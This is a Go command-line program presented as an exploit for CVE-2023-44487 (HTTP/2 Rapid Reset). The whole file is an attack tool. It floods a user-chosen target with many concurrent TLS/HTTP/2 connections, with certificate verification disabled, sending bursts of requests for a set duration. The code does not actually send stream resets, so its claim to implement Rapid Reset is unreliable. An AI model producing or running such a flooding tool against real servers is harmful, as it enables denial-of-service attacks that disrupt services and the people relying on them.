package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/http2"
)

// RapidResetEngine implements CVE-2023-44487
type RapidResetEngine struct {
	Target   string
	Threads  int
	Duration int
}

func main() {
	target := flag.String("target", "", "Target URL (https://host[:port]) or host:port")
	threads := flag.Int("threads", 10, "Concurrent connections")
	duration := flag.Int("duration", 60, "Duration in seconds")
	flag.Parse()

	if *target == "" {
		fmt.Println("Usage: rapid_reset --target <url>")
		return
	}

	engine := &RapidResetEngine{
		Target:   *target,
		Threads:  *threads,
		Duration: *duration,
	}

	engine.Run()
}

func (e *RapidResetEngine) Run() {
	fmt.Printf("[!] ARSENAL 2026: HTTP/2 Rapid Reset Active [!]\n")
	fmt.Printf("[*] Target: %s | Connections: %d\n", e.Target, e.Threads)

	var wg sync.WaitGroup
	stop := make(chan bool)

	for i := 0; i < e.Threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			e.attack(stop)
		}()
	}

	time.Sleep(time.Duration(e.Duration) * time.Second)
	close(stop)
	wg.Wait()
	fmt.Println("[+] Attack Cycle Finished.")
}

// normalizeTarget returns (hostPort, sni, path)
func (e *RapidResetEngine) normalizeTarget() (string, string, string) {
	t := e.Target
	path := "/"
	sni := ""

	if strings.Contains(t, "://") {
		u, err := url.Parse(t)
		if err == nil {
			host := u.Host
			sni = u.Hostname()
			if u.Port() == "" {
				host = net.JoinHostPort(sni, "443")
			}
			if u.Path != "" {
				path = u.Path
			}
			return host, sni, path
		}
	}

	if !strings.Contains(t, ":") {
		sni = t
		return net.JoinHostPort(t, "443"), sni, path
	}

	host, _, err := net.SplitHostPort(t)
	if err == nil {
		sni = host
	}
	return t, sni, path
}

func (e *RapidResetEngine) attack(stop chan bool) {
	hostPort, sni, path := e.normalizeTarget()

	for {
		select {
		case <-stop:
			return
		default:
			// Establish TCP + TLS
			conf := &tls.Config{
				InsecureSkipVerify: true,
				ServerName:         sni,
				NextProtos:         []string{"h2"},
			}

			conn, err := tls.Dial("tcp", hostPort, conf)
			if err != nil {
				time.Sleep(1 * time.Second)
				continue
			}

			// Force HTTP/2
			t := &http2.Transport{}
			h2Conn, err := t.NewClientConn(conn)
			if err != nil {
				conn.Close()
				continue
			}

			// Flood Streams with rapid request pattern
			for j := 0; j < 1000; j++ {
				req, _ := http.NewRequest("GET", "https://"+sni+path, nil)
				resp, err := h2Conn.RoundTrip(req)
				if err == nil {
					resp.Body.Close()
				}
			}
			h2Conn.Close()
		}
	}
}
